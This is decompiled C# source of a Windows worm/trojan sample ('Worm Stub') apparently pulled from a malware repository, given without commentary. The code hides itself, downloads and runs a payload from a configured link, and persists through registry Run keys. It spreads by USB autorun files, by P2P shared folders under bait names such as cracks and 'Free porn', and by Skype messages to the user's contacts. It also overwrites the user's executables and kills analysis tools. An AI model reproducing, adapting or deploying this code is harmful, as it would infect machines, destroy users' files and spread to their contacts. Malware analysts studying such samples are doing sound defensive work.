// Decompiled with JetBrains decompiler
// Type: Worm_Stub.Form1
// Assembly: Worm Stub, Version=2.0.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3CDB14-EBC4-49A1-A390-B2635BB34BD7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.hekx-ec754abadcf18e0478a7d2c9c5ecfd09812f77ec6bc75bc8ca599ac17658ef11.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Worm_Stub.My;

namespace Worm_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private const string FileSplit = "---MARIJUANA!@#$!%@#$@%---";
    private string self;
    private string[] Settings;
    private bool usbtrueorfalse;
    private string DownloadLink;
    private object Devices;
    private string Grafikadapter;
    private string RegionA;
    private string id;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.RegionA = "SELECT * FROM Win32_VideoController";
      this.id = "76487-337-8429955-22614";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.ShowInTaskbar = false;
      this.Hide();
      string[] parameters = new Stub().GetParameters(Application.ExecutablePath);
      this.DownloadLink = parameters[0];
      this.downloader();
      this.AddStartup();
      if (Operators.CompareString(parameters[1], "True", false) == 0)
        this.usb_spreader();
      if (Operators.CompareString(parameters[2], "True", false) == 0)
        this.antis();
      if (Conversions.ToBoolean(parameters[3]) && System.IO.File.Exists(Interaction.Environ("appdata") + "\\google.exe"))
        this.P2P(Interaction.Environ("appdata") + "\\google.exe");
      if (Conversions.ToBoolean(parameters[4]))
        this.exe();
      if (Conversions.ToBoolean(parameters[5]))
        this.tsk();
      if (Conversions.ToBoolean(parameters[6]))
        this.skype();
      if (!Conversions.ToBoolean(parameters[7]))
        return;
      this.lan();
    }

    public void lan()
    {
      try
      {
        Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
        Dns.GetHostEntry("workgroup");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, "workgroup");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void skype()
    {
      try
      {
        Process.Start("C:\\Program Files (x86)\\Skype\\Phone");
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(Interaction.Environ("appdata") + "sc4.vbs", FileMode.Create, FileAccess.Write));
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter.WriteLine("on error resume next");
        streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
        streamWriter.WriteLine("Fruxr.Client.Start()");
        streamWriter.WriteLine("Fruxr.Attach()");
        streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
        streamWriter.WriteLine("Fruxr.SendMessage KZN.handle,\"Get this. Don't even ask questions, There's no time!! $285 program, year subscription of skype FREE! " + this.DownloadLink + "\"");
        streamWriter.WriteLine("next");
        streamWriter.Close();
        Process.Start(Interaction.Environ("appdata") + "sc4.vbs");
        FileInfo fileInfo = new FileInfo(Interaction.Environ("appdata") + "sc4.vbs");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void exe()
    {
      try
      {
        string[] files1 = Directory.GetFiles(Interaction.Environ("userprofile"), "*.exe", SearchOption.TopDirectoryOnly);
        string[] files2 = Directory.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, "*.exe", SearchOption.TopDirectoryOnly);
        string[] strArray1 = files1;
        int index1 = 0;
        while (index1 < strArray1.Length)
        {
          string str = strArray1[index1];
          System.IO.File.Delete(str);
          FileSystem.FileCopy(Interaction.Environ("appdata") + "\\google.exe", str);
          checked { ++index1; }
        }
        string[] strArray2 = files2;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string str = strArray2[index2];
          System.IO.File.Delete(str);
          FileSystem.FileCopy(Interaction.Environ("appdata") + "\\google.exe", str);
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void P2P(string filepath)
    {
      string[] strArray1 = new string[17];
      string str1 = "C:\\Program Files";
      strArray1[0] = str1 + "\\KMD\\My Shared Folder\\";
      strArray1[1] = str1 + "\\KMD\\My Shared Folder\\";
      strArray1[2] = str1 + "\\KaZaA Lite\\My Shared Folder\\";
      strArray1[3] = str1 + "\\Bear Share\\Shared\\";
      strArray1[4] = str1 + "\\LimeWire\\Shared\\";
      strArray1[5] = str1 + "\\mirc32\\";
      strArray1[6] = str1 + "\\kazaa\\my shared folder\\";
      strArray1[7] = str1 + "\\kazaa lite k&&\\my shared folder\\";
      strArray1[8] = str1 + "\\icq\\shared folder\\";
      strArray1[9] = str1 + "\\grokster\\my grokster\\";
      strArray1[10] = str1 + "\\edonkey2000\\incoming\\";
      strArray1[11] = str1 + "\\emule\\incoming\\";
      strArray1[12] = str1 + "\\tesla\\files\\";
      strArray1[13] = str1 + "\\Ares\\My Shared Folder\\";
      strArray1[14] = str1 + "\\winmx\\shared\\";
      strArray1[15] = str1 + "\\apex\\shared";
      string[] strArray2 = new string[8];
      string str2 = ".exe";
      strArray2[0] = "Windows 7 (x86/x64) WGA/WAT crack" + str2;
      strArray2[1] = "Photoshop CS5 updatable&crack&keygen" + str2;
      strArray2[2] = "World Of Warcraft unlimited premium crack updatable" + str2;
      strArray2[3] = "Office 2011 cracked" + str2;
      strArray2[4] = "Avira latest updatable cracked&keygen" + str2;
      strArray2[5] = " Free Anti Virus " + str2;
      strArray2[6] = " Free porn" + str2;
      string[] strArray3 = strArray1;
      int index1 = 0;
      while (index1 < strArray3.Length)
      {
        string str3 = strArray3[index1];
        string[] strArray4 = strArray2;
        int index2 = 0;
        while (index2 < strArray4.Length)
        {
          string str4 = strArray4[index2];
          try
          {
            FileSystem.FileCopy(filepath, str3 + str4);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public object antis()
    {
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        obj1 = Process.GetProcessesByName("avp").Length < 1 ? (object) false : (object) true;
        goto label_13;
label_8:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            Process[] processes = Process.GetProcesses();
            int index = 0;
            while (index < processes.Length)
            {
              Process process = processes[index];
              if (string.Equals(process.MainWindowTitle, "The Wireshark Network Analyzer"))
                process.Kill();
              checked { ++index; }
            }
            ProjectData.EndApp();
            goto label_13;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public void tsk()
    {
      try
      {
        int processId = Interaction.Shell("taskmgr.exe", AppWinStyle.Hide);
        while (true)
        {
          Process.GetProcessById(processId).WaitForExit();
          Thread.Sleep(50);
          processId = Interaction.Shell("taskmgr.exe", AppWinStyle.Hide);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void downloader()
    {
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.Name, (object) (Interaction.Environ("appdata") + "\\google.exe"), RegistryValueKind.String);
      if (System.IO.File.Exists(Interaction.Environ("appdata") + "\\google.exe"))
        System.IO.File.Delete(Interaction.Environ("appdata") + "\\google.exe");
      if (System.IO.File.Exists(Interaction.Environ("temp") + "\\java.exe"))
        System.IO.File.Delete(Interaction.Environ("temp") + "\\java.exe");
      MyProject.Computer.Network.DownloadFile(this.DownloadLink, Interaction.Environ("appdata") + "\\google.exe");
      Process.Start(Interaction.Environ("appdata") + "\\google.exe");
      MyProject.Computer.Network.DownloadFile(this.DownloadLink, Interaction.Environ("temp") + "\\java.exe");
      Process.Start(Interaction.Environ("temp") + "\\java.exe");
    }

    public void AddStartup()
    {
      string name = "java";
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string startupPath = Application.StartupPath;
      try
      {
        registryKey.SetValue(name, (object) startupPath, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void usb_spreader()
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
label_2:
        num3 = 2;
label_3:
        num3 = 3;
label_4:
        num3 = 4;
label_5:
        num3 = 5;
label_6:
        num3 = 6;
label_7:
        num3 = 7;
label_8:
        num3 = 8;
label_9:
        num3 = 9;
label_10:
        num3 = 10;
label_11:
        num3 = 11;
label_12:
        num3 = 12;
label_13:
        num3 = 13;
label_14:
        num3 = 14;
label_15:
        num3 = 15;
label_16:
        num3 = 16;
label_17:
        num3 = 17;
label_18:
        num3 = 18;
label_19:
        num3 = 19;
label_20:
        num3 = 20;
label_21:
        num3 = 21;
label_22:
        num3 = 22;
label_23:
        num3 = 23;
label_24:
        num3 = 24;
label_25:
        num3 = 25;
label_26:
        num3 = 26;
label_27:
        num3 = 27;
label_28:
        num3 = 28;
label_29:
        num3 = 29;
label_30:
        num3 = 30;
label_31:
        num3 = 31;
label_32:
        num3 = 32;
label_33:
        num3 = 33;
label_34:
        num3 = 34;
label_35:
        num3 = 35;
label_36:
        num3 = 36;
label_37:
        num3 = 37;
label_38:
        num3 = 38;
label_39:
        num3 = 39;
label_40:
        num3 = 40;
label_41:
        num3 = 41;
label_42:
        num3 = 42;
label_43:
        num3 = 43;
label_44:
        num3 = 44;
label_45:
        ProjectData.ClearProjectError();
        num1 = -2;
label_46:
        num3 = 46;
        string[] logicalDrives = Environment.GetLogicalDrives();
label_47:
        num3 = 47;
        int num4 = checked (logicalDrives.Length - 1);
        int index = 0;
        goto label_60;
label_48:
        num3 = 48;
        DriveInfo driveInfo = new DriveInfo(logicalDrives[index]);
label_49:
        num3 = 49;
        if (driveInfo.DriveType != DriveType.Removable)
          goto label_58;
label_50:
        num3 = 50;
        if (!driveInfo.IsReady)
          goto label_57;
label_51:
        num3 = 51;
        if (System.IO.File.Exists(logicalDrives[index] + "autorun.exe"))
          goto label_56;
label_52:
        num3 = 52;
        System.IO.File.Copy(Interaction.Environ("appdata") + "\\google.exe", Conversions.ToString(true));
label_53:
        num3 = 53;
        MyProject.Computer.FileSystem.WriteAllText(logicalDrives[index] + "autorun.inf", "[autorun]\r\nopen=" + logicalDrives[index] + "autorun.exe\r\nshellexecute=" + logicalDrives[index], true);
label_54:
        num3 = 54;
        FileSystem.SetAttr(logicalDrives[index] + "autorun.exe", FileAttribute.Hidden);
label_55:
        num3 = 55;
        FileSystem.SetAttr(logicalDrives[index] + "autorun.inf", FileAttribute.Hidden);
label_56:
label_57:
label_58:
label_59:
        num3 = 59;
        checked { ++index; }
label_60:
        if (index <= num4)
          goto label_48;
        else
          goto label_67;
label_62:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_21;
              case 22:
                goto label_22;
              case 23:
                goto label_23;
              case 24:
                goto label_24;
              case 25:
                goto label_25;
              case 26:
                goto label_26;
              case 27:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 30:
                goto label_30;
              case 31:
                goto label_31;
              case 32:
                goto label_32;
              case 33:
                goto label_33;
              case 34:
                goto label_34;
              case 35:
                goto label_35;
              case 36:
                goto label_36;
              case 37:
                goto label_37;
              case 38:
                goto label_38;
              case 39:
                goto label_39;
              case 40:
                goto label_40;
              case 41:
                goto label_41;
              case 42:
                goto label_42;
              case 43:
                goto label_43;
              case 44:
                goto label_44;
              case 45:
                goto label_45;
              case 46:
                goto label_46;
              case 47:
                goto label_47;
              case 48:
                goto label_48;
              case 49:
                goto label_49;
              case 50:
                goto label_50;
              case 51:
                goto label_51;
              case 52:
                goto label_52;
              case 53:
                goto label_53;
              case 54:
                goto label_54;
              case 55:
                goto label_55;
              case 56:
                goto label_56;
              case 57:
                goto label_57;
              case 58:
                goto label_58;
              case 59:
                goto label_59;
              case 60:
                goto label_67;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_62;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_67:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
